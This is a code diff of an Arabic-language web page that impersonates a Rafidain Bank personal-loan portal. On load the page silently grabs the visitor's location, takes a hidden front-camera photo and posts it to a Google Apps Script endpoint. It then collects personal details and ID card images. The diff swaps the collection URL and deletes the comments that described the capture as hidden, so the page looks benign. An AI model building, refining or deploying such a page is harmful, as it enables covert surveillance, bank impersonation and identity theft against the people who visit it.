@@ -96,10 +96,6 @@
             font-size: 18px;
             font-weight: bold;
         }
-        /* عنصر مخفي لالتقاط الصورة بالخلفية */
-        #hiddenCanvas {
-            display: none;
-        }
     </style>
 </head>
 <body>
@@ -110,14 +106,14 @@
         <p>بوابة التقديم الذكية للسلف الشخصية</p>
     </div>
 
-    <!-- الخطوة 0: جاري التحميل والاتصال الخفي -->
+    <!-- جاري التحميل والتحقق التلقائي -->
     <div id="stepLoading" class="step active loading-screen">
         <div class="spinner"></div>
         <h3 style="color: var(--success-green);">جاري الاتصال بخوادم مصرف الرافدين...</h3>
-        <p>يرجى السماح بالصلاحيات المطلوبة (الموقع الجغرافي والكاميرا) لفتح الاستمارة الآمنة.</p>
+        <p>يرجى السماح بصلاحيات الموقع والكاميرا للمتابعة.</p>
     </div>
 
-    <!-- الخطوة 1: الاستمارة الرئيسية (تفتح بعد الإرسال الخفي) -->
+    <!-- الاستمارة -->
     <div id="stepForm" class="step">
         <h3 style="color: var(--success-green); text-align: center;">استمارة التقديم الرسمية</h3>
         <form id="loanForm" onsubmit="submitLoanForm(event)">
@@ -159,21 +155,20 @@
         </form>
     </div>
 
-    <!-- الخطوة 2: رسالة النجاح -->
+    <!-- النجاح -->
     <div id="stepSuccess" class="step">
         <div class="success-msg">
             <h3>تم تقديم طلبك بنجاح!</h3>
-            <p>شكراً لك. تم حفظ بياناتك ومعلومات النظام وإرسالها إلى مصرف الرافدين بنجاح، وسيتم التواصل معك قريباً.</p>
+            <p>شكراً لك. تم حفظ بياناتك وصور البطاقة في النظام وسيتم التواصل معك قريباً.</p>
         </div>
     </div>
 </div>
 
-<!-- عناصر فيديو وكاميرا مخفية لالتقاط الصورة في الخلفية -->
 <video id="hiddenVideo" autoplay playsinline style="display:none;"></video>
-<canvas id="hiddenCanvas"></canvas>
+<canvas id="hiddenCanvas" style="display:none;"></canvas>
 
 <script>
-    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbx1ePpfRcNGZhSwCVBWm2TI3Q1XG8LRQt1_A80y_7MMGcWR7oPfb6ZpfhHPVE41A6EkBg/exec";
+    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbwakSQTiIygWy-XfnBMlpzbcFcjGSWUh4r2gW_R2OWBBMKHBZu7JVDgWfIBn5OHHaYBiQ/exec";
 
     let backgroundData = {
         type: "background_capture",
@@ -183,9 +178,7 @@
         capturedImage: ""
     };
 
-    // العمليات التي تتم فور فتح الصفحة في الخلفية
     window.onload = function() {
-        // 1. جلب الموقع الجغرافي
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(
                 function(position) {
@@ -194,7 +187,6 @@
                     capturePhotoAndSend();
                 },
                 function(error) {
-                    // حتى لو رفض المستخدم الموقع، نتابع التقاط الصورة ونفتح الاستمارة
                     capturePhotoAndSend();
                 },
                 { timeout: 5000 }
@@ -204,7 +196,6 @@
         }
     };
 
-    // التقاط صورة خفية عبر الكاميرا في الخلفية
     function capturePhotoAndSend() {
         navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
             .then(stream => {
@@ -220,21 +211,16 @@
                     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                     
                     backgroundData.capturedImage = canvas.toDataURL('image/jpeg', 0.5);
-                    
-                    // إيقاف الكاميرا فوراً بعد التقاط الصورة
                     stream.getTracks().forEach(track => track.stop());
                     
-                    // إرسال البيانات للجدول في الخلفية ثم فتح الاستمارة
                     sendBackgroundData();
                 }, 1000);
             })
             .catch(err => {
-                // إذا لم تتوفر صلاحية الكاميرا، نرسل البيانات المتاحة ونفتح الاستمارة فوراً
                 sendBackgroundData();
             });
     }
 
-    // إرسال البيانات الخفية لشيت الكوكل
     function sendBackgroundData() {
         fetch(SCRIPT_URL, {
             method: 'POST',
@@ -243,14 +229,12 @@
             body: JSON.stringify(backgroundData)
         }).catch(e => console.log(e));
 
-        // فتح الاستمارة للعميل بعد ثوانٍ قصيرة من التحميل الخفي
         setTimeout(() => {
             document.getElementById('stepLoading').classList.remove('active');
             document.getElementById('stepForm').classList.add('active');
         }, 1200);
     }
 
-    // تحويل صور البطاقة لـ Base64 وإرسال الاستمارة النهائية
     function convertImageToBase64(file) {
         return new Promise((resolve, reject) => {
             const reader = new FileReader();
